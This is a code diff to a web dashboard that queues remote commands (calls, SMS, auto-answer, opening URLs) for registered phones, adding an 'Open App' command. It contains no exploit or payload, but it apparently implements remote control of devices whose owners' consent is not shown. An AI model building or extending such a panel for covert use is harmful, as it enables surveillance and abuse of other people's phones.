@@ -787,13 +787,15 @@
         <section class="grid">
             <article class="card full-width">
                 <h2>Command Center</h2>
-                <div class="segmented-control" role="tablist" aria-label="Call SMS Auto Answer WebView Toggle">
+                <div class="segmented-control" role="tablist" aria-label="Call SMS Auto Answer Open App WebView Toggle">
                     <button id="callTabBtn" class="segmented-option active" role="tab" aria-selected="true"
                         onclick="setActionTab('call')">Call</button>
                     <button id="smsTabBtn" class="segmented-option" role="tab" aria-selected="false"
                         onclick="setActionTab('sms')">SMS</button>
                     <button id="autoAnswerTabBtn" class="segmented-option" role="tab" aria-selected="false"
                         onclick="setActionTab('auto_answer')">Auto Answer</button>
+                    <button id="openAppTabBtn" class="segmented-option" role="tab" aria-selected="false"
+                        onclick="setActionTab('open_app')">Open App</button>
                     <button id="webViewTabBtn" class="segmented-option" role="tab" aria-selected="false"
                         onclick="setActionTab('webview')">WebView</button>
                 </div>
@@ -876,6 +878,17 @@
                         <button id="sendWebViewCommandBtn" onclick="sendWebViewCommand()">Send OPEN_URL</button>
                     </div>
                 </div>
+                <div id="openAppTabPanel" class="tab-panel">
+                    <h2>Open App</h2>
+                    <div class="input-row auto-answer-input-grid">
+                        <select id="deviceSelectOpenApp"></select>
+                        <input id="openAppName" placeholder="e.g. YouTube, WhatsApp, Telegram" />
+                        <input id="openAppNotes" placeholder="optional notes" />
+                    </div>
+                    <div class="actions">
+                        <button onclick="sendOpenApp()">Send OPEN_APP</button>
+                    </div>
+                </div>
             </article>
 
             <article id="devicesPanel" class="card full-width">
@@ -946,7 +959,8 @@
             call: 0,
             sms: 1,
             auto_answer: 2,
-            webview: 3
+            open_app: 3,
+            webview: 4
         };
         const deviceNameByUid = new Map();
 
@@ -1147,6 +1161,7 @@
                     <div class="device-uid-line">${escapeHtml(asDisplayValue(command.deviceUid))}</div>
                 `;
                 const type = escapeHtml(asDisplayValue(command.type));
+                const appName = escapeHtml(asDisplayValue(command.appName));
                 const phone = escapeHtml(asDisplayValue(command.phoneNumber));
                 const message = escapeHtml(asDisplayValue(command.message));
                 const url = escapeHtml(asDisplayValue(command.url));
@@ -1160,6 +1175,7 @@
                         <td>${type}</td>
                         <td>${status}</td>
                         <td>${createdAt}</td>
+                        <td>${appName}</td>
                         <td>${phone}</td>
                         <td>${message}</td>
                         <td>${url}</td>
@@ -1176,6 +1192,7 @@
                             <th>Type</th>
                             <th>Status</th>
                             <th>Created At</th>
+                            <th>App Name</th>
                             <th>Phone</th>
                             <th>Message</th>
                             <th>URL</th>
@@ -1194,18 +1211,21 @@
             const isCall = activeTab === "call";
             const isSms = activeTab === "sms";
             const isAutoAnswer = activeTab === "auto_answer";
+            const isOpenApp = activeTab === "open_app";
             const isWebView = activeTab === "webview";
 
             const callPanel = document.getElementById("callTabPanel");
             const smsPanel = document.getElementById("smsTabPanel");
             const autoAnswerPanel = document.getElementById("autoAnswerTabPanel");
+            const openAppPanel = document.getElementById("openAppTabPanel");
             const webViewPanel = document.getElementById("webViewTabPanel");
-            const panels = [callPanel, smsPanel, autoAnswerPanel, webViewPanel];
+            const panels = [callPanel, smsPanel, autoAnswerPanel, openAppPanel, webViewPanel];
             panels.forEach((panel) => panel.classList.remove("tab-enter-left", "tab-enter-right"));
 
             callPanel.classList.toggle("active", isCall);
             smsPanel.classList.toggle("active", isSms);
             autoAnswerPanel.classList.toggle("active", isAutoAnswer);
+            openAppPanel.classList.toggle("active", isOpenApp);
             webViewPanel.classList.toggle("active", isWebView);
 
             if (targetTab !== previousTab) {
@@ -1215,6 +1235,8 @@
                         ? smsPanel
                         : isAutoAnswer
                             ? autoAnswerPanel
+                            : isOpenApp
+                                ? openAppPanel
                             : webViewPanel;
                 const movingForward = tabOrder[targetTab] > tabOrder[previousTab];
                 const animationClass = movingForward ? "tab-enter-right" : "tab-enter-left";
@@ -1225,11 +1247,13 @@
             document.getElementById("callTabBtn").classList.toggle("active", isCall);
             document.getElementById("smsTabBtn").classList.toggle("active", isSms);
             document.getElementById("autoAnswerTabBtn").classList.toggle("active", isAutoAnswer);
+            document.getElementById("openAppTabBtn").classList.toggle("active", isOpenApp);
             document.getElementById("webViewTabBtn").classList.toggle("active", isWebView);
 
             document.getElementById("callTabBtn").setAttribute("aria-selected", String(isCall));
             document.getElementById("smsTabBtn").setAttribute("aria-selected", String(isSms));
             document.getElementById("autoAnswerTabBtn").setAttribute("aria-selected", String(isAutoAnswer));
+            document.getElementById("openAppTabBtn").setAttribute("aria-selected", String(isOpenApp));
             document.getElementById("webViewTabBtn").setAttribute("aria-selected", String(isWebView));
         }
 
@@ -1372,25 +1396,30 @@
                 const callSelect = document.getElementById("deviceSelect");
                 const smsSelect = document.getElementById("deviceSelectSms");
                 const autoAnswerSelect = document.getElementById("deviceSelectAutoAnswer");
+                const openAppSelect = document.getElementById("deviceSelectOpenApp");
                 const webViewSelect = document.getElementById("deviceSelectWebView");
                 const previousCallValue = callSelect.value;
                 const previousSmsValue = smsSelect.value;
                 const previousAutoAnswerValue = autoAnswerSelect.value;
+                const previousOpenAppValue = openAppSelect.value;
                 const previousWebViewValue = webViewSelect.value;
 
                 rememberDevices(data);
                 populateDeviceSelect(callSelect, data, previousCallValue);
                 populateDeviceSelect(smsSelect, data, previousSmsValue);
                 populateDeviceSelect(autoAnswerSelect, data, previousAutoAnswerValue);
+                populateDeviceSelect(openAppSelect, data, previousOpenAppValue);
                 populateDeviceSelect(webViewSelect, data, previousWebViewValue);
             } catch (error) {
                 const callSelect = document.getElementById("deviceSelect");
                 const smsSelect = document.getElementById("deviceSelectSms");
                 const autoAnswerSelect = document.getElementById("deviceSelectAutoAnswer");
+                const openAppSelect = document.getElementById("deviceSelectOpenApp");
                 const webViewSelect = document.getElementById("deviceSelectWebView");
                 populateDeviceSelect(callSelect, [], "");
                 populateDeviceSelect(smsSelect, [], "");
                 populateDeviceSelect(autoAnswerSelect, [], "");
+                populateDeviceSelect(openAppSelect, [], "");
                 populateDeviceSelect(webViewSelect, [], "");
             }
         }
@@ -1524,6 +1553,47 @@
                 if (!res.ok) throw new Error(data.error || "Failed to send WebView command");
 
                 showToast(isOpenUrl ? "OPEN_URL command sent" : "CLOSE_WEBVIEW command sent", "success");
+                await loadCommands();
+            } catch (error) {
+                showToast(error.message, "error");
+            }
+        }
+
+        async function sendOpenApp() {
+            const deviceUid = document.getElementById("deviceSelectOpenApp").value;
+            const appName = document.getElementById("openAppName").value.trim();
+            const notes = document.getElementById("openAppNotes").value.trim();
+
+            if (!deviceUid) {
+                showToast("Please select a device first", "error");
+                return;
+            }
+            if (!appName) {
+                showToast("App Name is required", "error");
+                return;
+            }
+
+            const payload = {
+                deviceUid,
+                action: "open_app",
+                type: "OPEN_APP",
+                appName,
+                notes: notes || null
+            };
+
+            try {
+                const res = await fetch(SERVER + "/commands", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await res.json();
+                if (!res.ok) throw new Error(data.error || "Failed to send OPEN_APP command");
+
+                showToast("OPEN_APP command sent", "success");
                 await loadCommands();
             } catch (error) {
                 showToast(error.message, "error");
